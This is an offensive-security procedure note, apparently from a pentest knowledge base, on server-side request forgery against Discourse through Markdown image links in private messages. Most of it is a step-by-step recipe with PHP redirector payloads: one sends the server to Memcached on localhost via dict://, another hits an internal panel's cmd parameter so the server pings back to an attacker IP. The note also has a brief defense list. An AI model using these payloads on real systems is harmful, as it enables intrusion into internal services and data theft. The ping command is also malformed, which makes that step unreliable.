---
id: proc-insert-ssrf-payload
tags:
  - ssrf
  - payload
  - markdown
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/php-redirect-to-dict-memcached]]'
  - '[[commands/php-redirect-to-internal-rce]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:53:38.087Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Insert-SSRF-Payload-in-Message

## Summary

Embed a malicious image URL in the private message content using Markdown syntax, pointing to an attacker-controlled redirect that abuses protocols or targets internal hosts.

## Description

Discourse processes Markdown in messages, fetching external images via URL. By linking to a PHP redirector, the server follows to ftp://, gopher://, or internal localhost, bypassing client-side restrictions. This exploits lack of URL validation in the /posts endpoint.

## Requirements

1. Prepared redirect server from prior procedure
2. Knowledge of target internal services (e.g., Memcached on 11211)
3. Markdown syntax familiarity

## Defense

Defensive measures and detection strategies:

- Sanitize URLs to HTTP/HTTPS only; block IP literals and private ranges
- Scan message content for suspicious protocols pre-fetch
- Log all image fetch attempts with full URL

## Objectives

1. Insert valid-looking image tag with SSRF URL
2. Target specific protocols or internals

## Instructions

### Step 1: Craft Markdown Payload

**Context**: Use alt-text and URL to embed the malicious link.

**Command** (Markdown input):
TEST ![ ](http://192.166.218.53/malicious3.php)

> Where malicious3.php uses [[commands/php-redirect-to-ftp]]. Expected: Preview shows image placeholder.

### Step 2: Target Internal Service

**Context**: Adapt for localhost access, e.g., Dict to Memcached.

**Command** ([[commands/php-redirect-to-dict-memcached]]):
```php
<?php header('Location: dict://localhost:11211/stat'); ?>
```

> Redirects to internal stats endpoint. Expected: Server queries Memcached and potentially leaks data via response.

### Step 3: Hypothetical RCE Payload

**Context**: For vulnerable internal panels.

**Command** ([[commands/php-redirect-to-internal-rce]]):
```php
<?php header('Location: http://127.0.0.1:1234/mypanel.php?cmd=ping -c 192.166.218.53'); ?>
```

> Forces execution of ping command. Expected: ICMP to attacker confirming RCE.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/php-redirect-to-dict-memcached]]
- [[commands/php-redirect-to-internal-rce]]

## Tools Used


## Tags

- ssrf
- payload
- internal-access
